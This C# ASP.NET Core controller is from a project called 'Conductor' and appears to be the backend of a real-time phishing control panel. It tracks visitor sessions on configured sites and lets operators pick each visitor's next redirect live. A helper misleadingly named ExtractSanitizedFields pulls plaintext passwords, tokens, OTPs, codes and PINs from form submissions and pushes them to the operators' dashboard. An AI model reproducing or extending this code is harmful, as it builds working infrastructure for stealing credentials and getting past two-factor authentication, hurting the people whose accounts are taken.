using Conductor.Db;
using Conductor.Models;
using Conductor.RealTime;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using Microsoft.EntityFrameworkCore;
using System.Net;
using System.Security.Claims;
using System.Text.Json;
using Conductor.Helpers;

namespace Conductor.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    [Authorize]
    public class DashboardController : ControllerBase
    {
        private readonly ILogger<DashboardController> _logger;
        private readonly AppDb _db;
        private readonly IHubContext<DashboardHub> _hub;
        
        public DashboardController(ILogger<DashboardController> logger, AppDb db, IHubContext<DashboardHub> hub)
        {
            _logger = logger;
            _db = db;
            _hub = hub;
        }

        public record DecideReq(int TicketId, int SessionId, string RedirectPath);
        public record ClaimSessionReq(int SessionId);
        public record CreateSiteReq(string Name, string Origin, List<string> Pages, bool ManualRoutingEnabled, string? DefaultFlowPath, string? TerminalPath, SiteType Type);
        public record UpdateSiteReq(string? Name, string? Origin, List<string>? Pages, bool? ManualRoutingEnabled, string? DefaultFlowPath, string? TerminalPath, SiteType? Type);

        [HttpGet("assigned-sites")]
        public async Task<IActionResult> GetAssignedSites()
        {
            var currentUserId = int.Parse(User.FindFirst("sub")?.Value ?? "0");
            var userRole = User.FindFirst(ClaimTypes.Role)?.Value ?? "user";

            List<Site> sites;

            if (userRole == "admin")
            {
                // Admins can see all active sites
                sites = await _db.Sites.Where(s => s.IsActive).ToListAsync();
            }
            else
            {
                // Regular users only see assigned sites
                sites = await _db.Sites
                    .Where(s => s.IsActive && _db.UserSiteAssignments.Any(usa => usa.UserId == currentUserId && usa.SiteId == s.Id))
                    .ToListAsync();
            }

            return Ok(sites);
        }

        [HttpGet("sites/{siteId}/sessions")]
        public async Task<IActionResult> GetSiteSessions(int siteId)
        {
            // Use 90-second inactivity threshold (3 × 30s heartbeat)

            var heartbeatInterval = 30; // seconds – keep in sync with client
            var inactiveThreshold = TimeSpan.FromSeconds(heartbeatInterval * 2); // 60 s

            // Fetch sessions to memory for time arithmetic (SQLite limitation)
            var allSessions = _db.Sessions.ToList();

            var cutoff = DateTimeOffset.UtcNow - inactiveThreshold;
            var staleSessions = allSessions.Where(s => s.IsActive && s.LastSeenAt < cutoff).ToList();
            if (staleSessions.Count > 0)
            {
                foreach (var s in staleSessions) s.IsActive = false;
                await _db.SaveChangesAsync();
            }

            // Pre-compute latest submission per session (run query once then process in-memory)
            var latestSubs = _db.Submissions
                .OrderByDescending(sub => sub.Id) // latest first
                .AsEnumerable() // switch to client-side before grouping (avoids JsonElement issues)
                .GroupBy(sub => sub.SessionId)
                .ToDictionary(g => g.Key, g => {
                    var latest = g.First();
                    var payload = latest.Payload.RootElement;
                    string pagePath = "/";
                    if (payload.TryGetProperty("url", out var urlProp))
                    {
                        if (Uri.TryCreate(urlProp.GetString(), UriKind.Absolute, out var uri))
                        {
                            pagePath = uri.PathAndQuery;
                        }
                    }
                    if (string.IsNullOrWhiteSpace(pagePath)) pagePath = $"/page-{latest.PageId}";

                    return new {
                        latest.PageId,
                        latest.CreatedAt,
                        PagePath = pagePath,
                        Fields = ExtractSanitizedFields(payload)
                    };
                });

            // Pre-compute latest decision per session to derive post-redirect page
            var latestSteps = _db.NextSteps
                .OrderByDescending(ns => ns.Id)
                .AsEnumerable()
                .GroupBy(ns => ns.SessionId)
                .ToDictionary(g => g.Key, g => new {
                    g.First().RedirectPath,
                    g.First().Status,
                    g.First().CreatedAt,
                    g.First().DecidedAt
                });

            var sessions = allSessions.Select(s => new
            {
                s.Id,
                Ip = s.Ip.ToString(),
                s.UserAgent,
                s.StartedAt,
                s.LastSeenAt,
                s.IsActive,
                hasPendingTicket = _db.NextSteps.Any(ns => ns.SessionId == s.Id && ns.Status == "pending"),
                hasDecidedTicket = _db.NextSteps.Any(ns => ns.SessionId == s.Id && ns.Status == "decided"),
                hasProcessedTicket = _db.NextSteps.Any(ns => ns.SessionId == s.Id && ns.Status == "processed"),
                LatestSubmission = latestSubs.TryGetValue(s.Id, out var sub) ? sub : null,
                LatestDecision = latestSteps.TryGetValue(s.Id, out var step) ? step : null
            })
            .Select(s => new
            {
                s.Id,
                s.Ip,
                s.UserAgent,
                s.StartedAt,
                s.LastSeenAt,
                s.LatestSubmission,
                s.LatestDecision,
                CurrentPage =
                    s.LatestSubmission == null && s.LatestDecision != null && !string.IsNullOrWhiteSpace(s.LatestDecision.RedirectPath)
                        ? s.LatestDecision.RedirectPath
                        : (s.LatestSubmission != null && s.LatestDecision != null
                            ? (((s.LatestDecision.DecidedAt ?? s.LatestDecision.CreatedAt) > s.LatestSubmission.CreatedAt) && !string.IsNullOrWhiteSpace(s.LatestDecision.RedirectPath)
                                ? s.LatestDecision.RedirectPath
                                : s.LatestSubmission.PagePath)
                            : (s.LatestSubmission != null ? s.LatestSubmission.PagePath : null)),
                PendingTicketId = s.hasPendingTicket ? _db.NextSteps.Where(ns => ns.SessionId == s.Id && ns.Status == "pending").OrderByDescending(ns => ns.Id).Select(ns => ns.Id).FirstOrDefault() : (int?)null,
                status = SessionStatusHelper.DetermineSessionStatus(
                    s.hasPendingTicket,
                    s.hasDecidedTicket,
                    s.hasProcessedTicket,
                    _db.NextSteps.Any(ns => ns.SessionId == s.Id && ns.Status == "completed"),
                    s.IsActive,
                    s.LastSeenAt,
                    inactiveThreshold
                ),
                SiteId = siteId,
                IsLocked = false,
                AssignedTo = (string?)null
            })
            .ToList();

            return Ok(sessions);
        }

        [HttpPost("sessions/{sessionId}/claim")]
        public async Task<IActionResult> ClaimSession(int sessionId)
        {
            var session = await _db.Sessions.FindAsync(sessionId);
            if (session == null || !session.IsActive)
                return NotFound(new { message = "Session not found or inactive" });

            // TODO: Implement session locking logic
            // For now, just return success
            var username = User.Identity?.Name ?? "unknown";
            
            await _hub.Clients.Group($"site-{sessionId}")
                .SendAsync("userClaimed", new { sessionId, claimedBy = username });

            return Ok(new { ok = true });
        }

        [HttpPost("decide")]
        public async Task<IActionResult> Decide([FromBody] DecideReq req)
        {
            NextStep? t = null;

            if (req.TicketId > 0)
            {
                t = await _db.Set<NextStep>().FindAsync(req.TicketId);
            }

            // Fallback: locate by session if ticket not provided
            if (t == null && req.SessionId > 0)
            {
                t = await _db.Set<NextStep>()
                    .Where(ns => ns.SessionId == req.SessionId && ns.Status == "pending")
                    .OrderByDescending(ns => ns.Id)
                    .FirstOrDefaultAsync();
            }

            if (t == null || t.Status != "pending") return NotFound();

            var sub = await _db.Set<Submission>().FindAsync(t.SubmissionId);
            if (sub == null) return NotFound();

            t.RedirectPath = req.RedirectPath;
            t.Status = "decided";
            t.DecidedAt = DateTimeOffset.UtcNow;
            await _db.SaveChangesAsync();

            // Notify session-specific SignalR group (for the user)
            await _hub.Clients.Group($"sess-{t.SessionId}")
                .SendAsync("nextStepDecided", new { ticketId = t.Id, redirect = t.RedirectPath, submissionId = t.SubmissionId, pageId = t.PageId });

            // Notify dashboards monitoring this site of decision (optional UI cues)
            await _hub.Clients.Group($"site-{t.SiteId}")
                .SendAsync("nextStepDecided", new { sessionId = t.SessionId, redirect = t.RedirectPath, pageId = t.PageId });

            var latestSub = _db.Submissions
                .Where(sub => sub.SessionId == t.SessionId)
                .OrderByDescending(sub => sub.Id)
                .FirstOrDefault();

            // Broadcast updated status as LIVE (user is navigating to next page)
            var sessionUpdate = new
            {
                id = t.SessionId,
                sessionId = t.SessionId,
                status = "live",
                lastSeenAt = DateTimeOffset.UtcNow,
                latestSubmission = latestSub != null ? new {
                    pageId = latestSub.PageId,
                    createdAt = latestSub.CreatedAt,
                    fields = ExtractSanitizedFields(latestSub.Payload.RootElement)
                } : (object?)null
            };

            await _hub.Clients.Group("dashboard").SendAsync("sessionUpdated", sessionUpdate);

            return Ok(new { ok = true });
        }

        [HttpDelete("sessions/{sessionId}")]
        public async Task<IActionResult> RemoveSession(int sessionId)
        {
            var session = await _db.Sessions.FindAsync(sessionId);
            if (session == null) return NotFound();

            // Always mark inactive first – even live sessions can be force-removed by dashboard
            session.IsActive = false;

            _db.Sessions.Remove(session);
            await _db.SaveChangesAsync();

            // Notify all dashboards that the session has been deleted so they can update UI in real-time
            await _hub.Clients.Group("dashboard").SendAsync("sessionDeleted", new { sessionId });

            return Ok(new { ok = true });
        }

        [HttpPost("sites")]
        [Authorize(Roles = "admin")]
        public async Task<IActionResult> CreateSite([FromBody] CreateSiteReq req)
        {
            var currentUserId = int.Parse(User.FindFirst("sub")?.Value ?? "0");

            // If no pages provided, use predefined pages for the site type
            var pages = req.Pages ?? new List<string>();
            if (!pages.Any() && req.Type != SiteType.Unknown)
            {
                pages = req.Type.GetDefaultPageOrder();
            }

            var site = new Site
            {
                Name = req.Name,
                Origin = req.Origin,
                Pages = pages,
                ManualRoutingEnabled = req.ManualRoutingEnabled,
                DefaultFlowPath = req.DefaultFlowPath,
                TerminalPath = req.TerminalPath,
                Type = req.Type,
                CreatedByUserId = currentUserId,
                CreatedAt = DateTimeOffset.UtcNow,
                IsActive = true
            };

            _db.Sites.Add(site);
            await _db.SaveChangesAsync();

            return Ok(site);
        }

        [HttpGet("sites")]
        public async Task<IActionResult> GetSites()
        {
            var currentUserId = int.Parse(User.FindFirst("sub")?.Value ?? "0");
            var userRole = User.FindFirst(ClaimTypes.Role)?.Value ?? "user";

            List<Site> sites;

            if (userRole == "admin")
            {
                sites = await _db.Sites.Where(s => s.IsActive).ToListAsync();
            }
            else
            {
                sites = await _db.Sites
                    .Where(s => s.IsActive && _db.UserSiteAssignments.Any(usa => usa.UserId == currentUserId && usa.SiteId == s.Id))
                    .ToListAsync();
            }

            return Ok(sites);
        }

        [HttpGet("sites/{siteId}")]
        public async Task<IActionResult> GetSite(int siteId)
        {
            var site = await _db.Sites.FindAsync(siteId);
            if (site == null) return NotFound();
            return Ok(site);
        }

        [HttpPut("sites/{siteId}")]
        [Authorize(Roles = "admin")]
        public async Task<IActionResult> UpdateSite(int siteId, [FromBody] UpdateSiteReq req)
        {
            var site = await _db.Sites.FindAsync(siteId);
            if (site == null) return NotFound();

            if (req.Name != null) site.Name = req.Name;
            if (req.Origin != null) site.Origin = req.Origin;
            if (req.Pages != null) site.Pages = req.Pages;
            if (req.ManualRoutingEnabled.HasValue) site.ManualRoutingEnabled = req.ManualRoutingEnabled.Value;
            if (req.DefaultFlowPath != null) site.DefaultFlowPath = req.DefaultFlowPath;
            if (req.TerminalPath != null) site.TerminalPath = req.TerminalPath;
            if (req.Type.HasValue) site.Type = req.Type.Value;

            await _db.SaveChangesAsync();
            return Ok(site);
        }

        [HttpDelete("sites/{siteId}")]
        [Authorize(Roles = "admin")]
        public async Task<IActionResult> DeleteSite(int siteId)
        {
            var site = await _db.Sites.FindAsync(siteId);
            if (site == null) return NotFound();

            // Soft delete
            site.IsActive = false;
            await _db.SaveChangesAsync();

            return Ok(new { ok = true });
        }



        // Helper to extract whitelisted fields for dashboard display
        public static Dictionary<string,string> ExtractSanitizedFields(JsonElement payload)
        {
            var whitelist = new[] {"email","user","username","login","password","pwd","pass","token","code","otp","pin"};
            Dictionary<string,string> sanitized = new();

            if (payload.TryGetProperty("formData", out var formData) && formData.ValueKind==JsonValueKind.Object)
            {
                foreach (var field in formData.EnumerateObject())
                {
                    var nameLower = field.Name.ToLowerInvariant();
                    if (whitelist.Any(w=>nameLower.Contains(w)))
                    {
                        sanitized[field.Name] = field.Value.ToString();
                    }
                }
            }

            if (sanitized.Count==0 && payload.ValueKind==JsonValueKind.Object)
            {
                foreach (var prop in payload.EnumerateObject())
                {
                    var nameLower = prop.Name.ToLowerInvariant();
                    if (whitelist.Any(w=>nameLower.Contains(w)))
                    {
                        sanitized[prop.Name] = prop.Value.ToString();
                    }
                }
            }

            return sanitized;
        }

    }
}
